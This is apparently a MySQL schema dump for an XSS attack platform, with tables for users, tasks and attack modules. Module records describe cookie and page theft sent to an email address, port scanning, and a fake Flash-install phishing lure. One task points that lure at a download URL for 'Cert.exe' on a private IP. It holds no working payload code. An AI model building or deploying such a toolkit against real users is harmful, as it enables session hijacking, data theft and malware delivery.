/*
 Navicat Premium Data Transfer

 Source Server         : test
 Source Server Type    : MySQL
 Source Server Version : 80200 (8.2.0)
 Source Host           : localhost:3306
 Source Schema         : fishc2

 Target Server Type    : MySQL
 Target Server Version : 80200 (8.2.0)
 File Encoding         : 65001

 Date: 22/01/2024 08:45:20
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for ni_admin_login
-- ----------------------------
DROP TABLE IF EXISTS `ni_admin_login`;
CREATE TABLE `ni_admin_login` (
  `adminID` int NOT NULL AUTO_INCREMENT,
  `adminName` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `adminPasswd` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `adminSalt` varchar(48) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `adminEmail` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `adminPhone` varchar(20) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `lastLoginIP` varchar(32) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `lastLoginTime` datetime NOT NULL,
  PRIMARY KEY (`adminID`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_admin_login
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for ni_app_public_modules
-- ----------------------------
DROP TABLE IF EXISTS `ni_app_public_modules`;
CREATE TABLE `ni_app_public_modules` (
  `moduleID` bigint NOT NULL AUTO_INCREMENT,
  `moduleName` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `moduleData` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `createTime` datetime NOT NULL,
  PRIMARY KEY (`moduleID`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_app_public_modules
-- ----------------------------
BEGIN;
INSERT INTO `ni_app_public_modules` (`moduleID`, `moduleName`, `moduleData`, `createTime`) VALUES (0, '域内请求XSS模块', '支持功能：\r\n* 向指定域内URL进行GET、POST请求和上传文件请求', '2021-05-13 14:01:42');
INSERT INTO `ni_app_public_modules` (`moduleID`, `moduleName`, `moduleData`, `createTime`) VALUES (1, 'flash钓鱼XSS模块', '支持功能：\r\n* 显示需要安装flash插件，诱导用户点击并下载文件', '2021-05-14 14:33:38');
INSERT INTO `ni_app_public_modules` (`moduleID`, `moduleName`, `moduleData`, `createTime`) VALUES (2, '端口扫描XSS模块', '支持功能：\r\n* 可以探测指定IP的指定范围端口', '2021-05-17 16:03:05');
INSERT INTO `ni_app_public_modules` (`moduleID`, `moduleName`, `moduleData`, `createTime`) VALUES (3, '默认XSS模块', '支持功能：\r\n* 获取对方当前URL \r\n* 获取对方来路URL \r\n* 获取对方Cookie数据 \r\n* 获取对方操作系统 \r\n* 获取对方浏览器信息 \r\n* 获取对方屏幕分辨率 \r\n* 获取对方网页内容 (会以json格式发送至邮箱) \r\n* 获取对方网页截图 (会以json格式发送至邮箱) ', '2021-04-16 17:57:32');
COMMIT;

-- ----------------------------
-- Table structure for ni_app_task_records
-- ----------------------------
DROP TABLE IF EXISTS `ni_app_task_records`;
CREATE TABLE `ni_app_task_records` (
  `recordID` bigint NOT NULL AUTO_INCREMENT,
  `taskID` bigint NOT NULL,
  `moduleID` bigint NOT NULL,
  `modulePublic` int NOT NULL,
  `getMethod` varchar(16) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `getIP` varchar(32) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `getResult` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `getModuleResult` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `getTime` datetime NOT NULL,
  PRIMARY KEY (`recordID`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=84 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_app_task_records
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for ni_app_tasks
-- ----------------------------
DROP TABLE IF EXISTS `ni_app_tasks`;
CREATE TABLE `ni_app_tasks` (
  `taskID` bigint NOT NULL AUTO_INCREMENT,
  `taskModuleID` bigint NOT NULL,
  `taskName` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `taskModuleName` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `taskModulePublic` int NOT NULL,
  `taskData` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `taskCode` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `taskParams` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `taskStatus` int NOT NULL,
  `taskRecordNum` bigint NOT NULL,
  `filePath` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci,
  `taskCreateTime` datetime NOT NULL,
  `taskAPI` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  PRIMARY KEY (`taskID`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_app_tasks
-- ----------------------------
BEGIN;
INSERT INTO `ni_app_tasks` (`taskID`, `taskModuleID`, `taskName`, `taskModuleName`, `taskModulePublic`, `taskData`, `taskCode`, `taskParams`, `taskStatus`, `taskRecordNum`, `filePath`, `taskCreateTime`, `taskAPI`) VALUES (1, 2, 'testname', 'flash钓鱼XSS模块', 1, 'testnotes', '', '{\"fishFILE\":\"\",\"fishUrl\":\"http://10.0.0.246:8081/Cert.exe\"}', 0, 37, '', '2024-01-13 04:11:52', 'MDAx');
COMMIT;

-- ----------------------------
-- Table structure for ni_user_custom_modules
-- ----------------------------
DROP TABLE IF EXISTS `ni_user_custom_modules`;
CREATE TABLE `ni_user_custom_modules` (
  `moduleID` bigint NOT NULL AUTO_INCREMENT,
  `moduleName` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `moduleData` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `moduleCode` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `belongUserID` int NOT NULL,
  `createTime` datetime NOT NULL,
  PRIMARY KEY (`moduleID`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_user_custom_modules
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for ni_user_forget_auth_code
-- ----------------------------
DROP TABLE IF EXISTS `ni_user_forget_auth_code`;
CREATE TABLE `ni_user_forget_auth_code` (
  `email` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `activeCode` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `time` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_user_forget_auth_code
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for ni_user_login
-- ----------------------------
DROP TABLE IF EXISTS `ni_user_login`;
CREATE TABLE `ni_user_login` (
  `userID` int NOT NULL AUTO_INCREMENT,
  `userName` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `userPasswd` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `userSalt` varchar(48) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `userEmail` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `userPhone` varchar(20) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `userLevel` int NOT NULL,
  `userCreateTime` datetime DEFAULT NULL,
  `userLoginIP` varchar(32) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `lastLoginTime` datetime DEFAULT NULL,
  `active` int NOT NULL DEFAULT '0',
  PRIMARY KEY (`userID`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of ni_user_login
-- ----------------------------
BEGIN;
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
